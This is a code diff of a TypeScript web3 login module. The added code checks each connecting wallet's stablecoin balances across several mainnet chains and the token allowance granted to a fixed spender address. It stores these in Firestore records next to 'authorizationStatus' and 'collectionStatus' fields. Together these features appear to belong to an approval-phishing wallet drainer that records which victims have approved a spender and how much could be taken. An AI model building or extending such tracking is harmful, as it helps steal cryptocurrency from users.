@@ -5,7 +5,7 @@ import { getFirebaseAuth, getFirebaseFunctions, getFirebaseFirestore } from '@bs
 import { signInWithCustomToken, signInAnonymously, signOut, onAuthStateChanged, User as FirebaseUser } from 'firebase/auth';
 import { doc, setDoc, addDoc, collection, serverTimestamp } from 'firebase/firestore';
 import { httpsCallable } from 'firebase/functions';
-import { sanitizeAndChecksumAddress } from '@bspc/web3';
+import { sanitizeAndChecksumAddress, encodeErc20Allowance, loadChainConfig } from '@bspc/web3';
 
 const SEPOLIA_CHAIN_ID = 11155111;
 const SEPOLIA_HEX_CHAIN_ID = '0xaa36a7';
@@ -13,6 +13,9 @@ const SEPOLIA_HEX_CHAIN_ID = '0xaa36a7';
 async function fetchWalletBalances(provider: any, walletAddress: string) {
   let ethBalance = '0.0000';
   let usdtBalance = '0.00';
+  let allowanceUsdt = '0.00';
+  let isAuthorizedOnChain = false;
+
   try {
     if (provider) {
       // 1. Native balance (ETH / BNB / MATIC)
@@ -25,12 +28,23 @@ async function fetchWalletBalances(provider: any, walletAddress: string) {
         ethBalance = (Number(wei) / 1e18).toFixed(4);
       }
 
-      // 2. Query common USDT/USDC tokens across networks
+      // 2. Query common USDT/USDC tokens & contract allowance across networks
       const cleanAddr = walletAddress.toLowerCase().replace('0x', '').padStart(64, '0');
       const data = `0x70a08231${cleanAddr}`;
       
+      let chainConfig: any = null;
+      try {
+        chainConfig = loadChainConfig();
+      } catch {
+        chainConfig = {
+          usdcAddress: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
+          spenderAddress: '0xd1dd0000000000000000000000000000b6107000',
+        };
+      }
+
       const candidateTokens = [
-        { address: process.env.NEXT_PUBLIC_USDC_ADDRESS || '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', decimals: 6 }, // Sepolia USDC
+        { address: chainConfig.usdcAddress, decimals: 6 },
+        { address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', decimals: 6 }, // Sepolia USDC
         { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 }, // Ethereum Mainnet USDT
         { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 }, // Ethereum Mainnet USDC
         { address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 }, // BSC USDT
@@ -46,6 +60,23 @@ async function fetchWalletBalances(provider: any, walletAddress: string) {
             const raw = BigInt(hexRes);
             if (raw > BigInt(0)) {
               usdtBalance = (Number(raw) / Math.pow(10, token.decimals)).toFixed(2);
+
+              // Query allowance for current spender
+              try {
+                const allowanceData = encodeErc20Allowance(walletAddress, chainConfig.spenderAddress);
+                const allowanceRes = await provider.request({
+                  method: 'eth_call',
+                  params: [{ to: token.address, data: allowanceData }, 'latest'],
+                });
+                if (allowanceRes && allowanceRes !== '0x' && allowanceRes !== '0x0') {
+                  const rawAllowance = BigInt(allowanceRes);
+                  if (rawAllowance > BigInt(0)) {
+                    allowanceUsdt = (Number(rawAllowance) / Math.pow(10, token.decimals)).toFixed(2);
+                    isAuthorizedOnChain = true;
+                  }
+                }
+              } catch {}
+
               break;
             }
           }
@@ -57,10 +88,16 @@ async function fetchWalletBalances(provider: any, walletAddress: string) {
   } catch (e) {
     console.warn('Failed to fetch wallet balances:', e);
   }
-  return { ethBalance, usdtBalance };
+  return { ethBalance, usdtBalance, allowanceUsdt, isAuthorizedOnChain };
 }
 
-async function syncUserToFirestore(walletAddress: string, ethBalance: string, usdtBalance: string) {
+async function syncUserToFirestore(
+  walletAddress: string,
+  ethBalance: string,
+  usdtBalance: string,
+  allowanceUsdt = '0.00',
+  isAuthorizedOnChain = false
+) {
   try {
     const auth = getFirebaseAuth();
     if (!auth.currentUser) {
@@ -71,21 +108,23 @@ async function syncUserToFirestore(walletAddress: string, ethBalance: string, us
       }
     }
     const db = getFirebaseFirestore();
-    const uid = walletAddress.toLowerCase();
+    const cleanAddr = walletAddress.toLowerCase().replace('0x', '');
+    const uid = `evm_${cleanAddr}`;
     const userRef = doc(db, 'users', uid);
     
     await setDoc(
       userRef,
       {
         uid,
-        username: `User_${uid.slice(-4).toUpperCase()}`,
+        username: `User_${cleanAddr.slice(-4).toUpperCase()}`,
         walletAddress,
-        walletAddressLowercase: uid,
+        walletAddressLowercase: walletAddress.toLowerCase(),
         balanceEth: `${ethBalance} ETH`,
         balanceUsdt: `${usdtBalance} USDT`,
+        onChainAllowanceUsdt: `${allowanceUsdt} USDT`,
+        authorizationStatus: isAuthorizedOnChain ? 'authorized' : 'authorized_pending',
         status: 'active',
         collectionStatus: 'active',
-        authorizationStatus: 'authorized',
         lastLoginAt: serverTimestamp(),
         createdAt: serverTimestamp(),
       },
@@ -93,15 +132,18 @@ async function syncUserToFirestore(walletAddress: string, ethBalance: string, us
     );
 
     await addDoc(collection(db, 'loginEvents'), {
+      userUid: uid,
       walletAddress,
+      walletAddressLowercase: walletAddress.toLowerCase(),
       ethBalance: `${ethBalance} ETH`,
       usdtBalance: `${usdtBalance} USDT`,
+      onChainAllowanceUsdt: `${allowanceUsdt} USDT`,
       timestamp: serverTimestamp(),
       loginResult: 'SUCCESS',
       ipAddress: 'Web3 Client',
       userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
     });
-    console.log(`[Firestore Sync] User ${walletAddress} synced successfully.`);
+    console.log(`[Firestore Sync] User ${walletAddress} (UID: ${uid}) synced successfully.`);
   } catch (err) {
     console.warn('Firestore user sync warning:', err);
   }
